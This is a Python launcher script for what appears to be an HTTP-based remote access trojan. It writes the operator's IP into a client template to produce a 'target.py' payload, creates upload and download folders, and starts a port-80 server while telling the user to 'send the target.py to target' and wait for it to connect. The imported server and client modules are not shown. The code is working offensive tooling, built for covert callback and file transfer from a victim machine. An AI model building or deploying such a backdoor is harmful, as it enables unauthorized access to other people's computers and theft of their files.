#!/usr/bin/python3 
from server import HTTPHandler
from http.server import HTTPServer
import socket as s
import argparse
import os

def arguments():
    defaultIP=s.gethostbyname(s.gethostname())
    parser = argparse.ArgumentParser(description='Get input for IP and port')
    parser.add_argument('-i', '--ip', metavar='192.168.1.1', help='The IP which the Web Server runs', default=defaultIP)
    args = parser.parse_args()
    return args.ip

def setTargetFile(ip):
    with open('client.py', 'r') as file :
        filedata = file.read()
    find='IP=""'
    replace=f'IP="{ip}"'
    filedata = filedata.replace(find, replace)
    with open('target.py', 'w') as file:
        file.write(filedata)

def makeFolders():
    if not os.path.exists("uploads"):
        os.mkdir("uploads")  
    if not os.path.exists("downloads"):
        os.mkdir("downloads")  
        

def main():
    IP=arguments()
    setTargetFile(IP)
    makeFolders()
    while True:
        try:
            httpd = HTTPServer((IP, 80), HTTPHandler)
            print("taget.py is created, Now send the target.py to target")
            print(f"Server started on {IP}:80\nWaiting for target to connect and")
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("You Have Closed the service")
            break
            os.remove('target.py')
        except Exception as e:
            print (str(e))
            os.remove('target.py')
            break      

if __name__ == '__main__':
    main()